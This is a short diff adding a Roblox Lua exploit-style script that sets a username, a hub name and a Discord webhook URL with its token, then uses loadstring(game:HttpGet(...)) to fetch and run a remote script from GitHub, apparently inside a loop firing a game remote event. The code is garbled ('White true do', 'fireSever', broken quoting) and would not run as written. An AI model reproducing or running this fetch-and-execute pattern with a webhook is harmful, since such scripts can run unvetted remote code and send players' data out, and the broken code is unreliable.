@@ -1,0 +1,7 @@
+White true do 
+   game.ReplicatedStorage.MainEvent:fireSever("_G.Username = "caovy2009"
+_G.HubName = "AutoFramingDiamond"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1092334584349335612/_KxUUd64QlVm4k9f3thPhccxNW7Dg7zKrzLCyNMwLw0YXO8p4E1gpsQzWbhpa9ttPM5F"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()")
+end
